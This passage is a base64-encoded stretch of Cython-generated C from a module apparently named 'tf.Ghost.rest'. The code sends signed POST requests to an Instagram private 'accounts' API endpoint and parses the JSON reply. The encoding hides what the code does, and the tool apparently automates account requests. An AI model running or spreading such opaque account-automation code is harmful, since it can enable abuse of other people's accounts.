nbG9iYWwtPl9fcHl4X25fdV9xdWVyeSwgX19weXhfdl91c2VyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfOCkpKSB7CiAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF84KTsKICAgICAgICBhc3NlcnQoX19weXhfdF82KTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzgsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X3RfN307CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF84ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZ19zaWdfa2V5X3ZlcnNpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfOCA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7CiAgICAgICAgX19weXhfdF84ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTsKICAgICAgICBhc3NlcnQoX19weXhfdF84KTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAzIDogMCldID0ge19fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjY307CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI2MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZW91dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNDsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSBfX3B5eF92X3Jlc3BvbnNlOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF85ID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI2NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzddLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X3IgPSBfX3B5eF90XzQ7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3Zfcik7CiAgICAgIF9fcHl4X3IgPSBfX3B5eF92X3I7CiAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjsKCiAgICAgIAogICAgfQogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19weXhfdF8xMCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTsKICAgIGlmIChfX3B5eF90XzEwKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QucmVzdCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzQsICZfX3B5eF90XzcsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDI2NiwgX19weXhfTDVfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdl9lID0gX19weXhfdF83OwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICAgICAgICBfX3B5eF90XzExID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgX19weXhfdF85ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X307CiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI2NywgX19weXhfTDE0X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgICAKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkKTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wxM19yZXR1cm47CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIF9fcHl4X0wxNF9lcnJvcjo7CiAgICAgICAgewogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJl9fcHl4X3RfMTcsICZfX3B5eF90XzE4LCAmX19weXhfdF8xOSk7CiAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2KSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMTIgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzEzID0gX19weXhfZmlsZW5hbWU7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNywgX19weXhfdF8xOCwgX19weXhfdF8xOSk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpOwogICAgICAgICAgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgIF9fcHl4X2xpbmVubyA9IF9fcHl4X3RfMTA7IF9fcHl4X2NsaW5lbm8gPSBfX3B5eF90XzEyOyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X3RfMTM7CiAgICAgICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjsKICAgICAgICB9CiAgICAgICAgX19weXhfTDEzX3JldHVybjogewogICAgICAgICAgX19weXhfdF8xOSA9IF9fcHl4X3I7CiAgICAgICAgICBfX3B5eF9yID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgX19weXhfciA9IF9fcHl4X3RfMTk7CiAgICAgICAgICBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDZfZXhjZXB0X3JldHVybjsKICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwoKICAgIAogICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w3X3RyeV9yZXR1cm46OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wwOwogICAgX19weXhfTDZfZXhjZXB0X3JldHVybjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIGdvdG8gX19weXhfTDA7CiAgfQoKICAKCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xOWRhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzE5ZGF0ZSA9IHsiZGF0ZSIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8xOWRhdGUsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xOWRhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSWQgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJkYXRlICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JZCwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAyNzAsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMjoKICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiZGF0ZSIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZGF0ZSIsIDEsIDIsIDIsI